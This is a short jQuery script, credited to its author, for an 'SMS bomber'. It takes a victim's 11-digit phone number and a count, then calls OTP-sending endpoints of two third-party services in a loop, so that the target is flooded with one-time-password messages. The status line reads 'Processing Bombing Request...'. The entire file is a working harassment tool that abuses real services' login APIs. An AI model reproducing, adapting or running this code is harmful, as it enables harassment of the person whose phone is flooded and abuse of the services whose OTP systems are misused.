// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {        
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val();
        if (amount > 0 && mobile.length == 11) {
            var c = 0;

            const APIS = [
                 {
                    method: 'GET',
                    url: `https://www.ieatery.com.bd/otp-verify?phn=${mobile}`},
                {
                    method: "POST",
                    url: "https://web-api.binge.buzz/api/v3/otp/send/login",
                    body: `phone=${mobile}`
                }

            ];

            while (c < amount) {
                APIS.forEach(API => {
                    $.ajax(API);
                    c += 1;
                });
            }
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Processing Bombing Request...");


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})
